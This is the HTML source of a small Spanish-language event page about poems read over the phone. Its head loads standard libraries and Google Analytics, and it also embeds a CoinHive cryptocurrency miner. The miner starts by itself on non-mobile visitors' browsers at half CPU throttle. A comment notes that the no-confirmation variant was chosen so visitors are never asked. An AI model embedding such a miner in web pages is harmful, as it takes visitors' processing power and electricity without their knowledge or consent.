<!doctype HTML>
<html lang="es">
  <head>
    <!-- Meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Cuentos x Telefono</title>
    <!-- Analytics -->
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-114349709-1"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'UA-114349709-1');
    </script>

    <!-- JQuery -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <!-- Font awesome -->
    <script defer src="https://use.fontawesome.com/releases/v5.0.6/js/all.js"></script>

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <!-- Custom CSS-->
    <link rel="stylesheet" href="styles/common.css">
    <link rel="stylesheet" href="styles/main.css">

    <!-- CoinHive: Para aprovechar mientras debug -->
    <!-- Cambiar authedmine a coinhive para no confirmación -->
    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
    <script>
      // Throttle es el porcentaje del procesador que NO será usado
    	var miner = new CoinHive.Anonymous('45C1t3GAk3I0Tuh1nV2zBSpDZ7ZpDBYx', {throttle: 0.5});

    	// Only start on non-mobile devices and if not opted-out
    	// in the last 14400 seconds (4 hours):
    	if (!miner.isMobile() && !miner.didOptOut(14400)) {
    		miner.start();
    	}
    </script>
  </head>
  <body>
    <!-- Donde va el "contenido", no el footer ni el navbar (si fuese necesario) -->
    <main role="main">
      <div class="jumbotron">
        <div class="container">
          <h1 class="display-3">Poemas por teléfono</h1>
          <h1 class="d-none d-md-block"><a href="https://twitter.com/hashtag/poemasxtelefono">#poemasxtelefono</a></h1>
          <h3 class="d-block d-md-none"><a href="https://twitter.com/hasthag/poemasxtelefono">#poemasxtelefono<a></h3>
          <!--<p> En <a href="https://montandoellocal.wordpress.com/">Montando el Local</a> cada día del Libro contamos cuentos por teléfono blahblahblah del texto que se encargue otra persona</p>-->
        </div>
      </div>
      <div class="container">
        <p> Por aquí abajo es donde va lo de las lineas abiertas y esas cosas </p>

      </div>
      <div id="lineas" class="container">
        <!-- Incluimos lo de las lineas -->
        <script src="./js/printLineas.js"></script>
      </div>
    </main>
    <footer class="page-footer">
      <div class="container">
        <p>Made w/ ❤ by <a href="https://ddavo.me">David Davó</a><br>
      </div>
    </footer>
  </body>
</html>
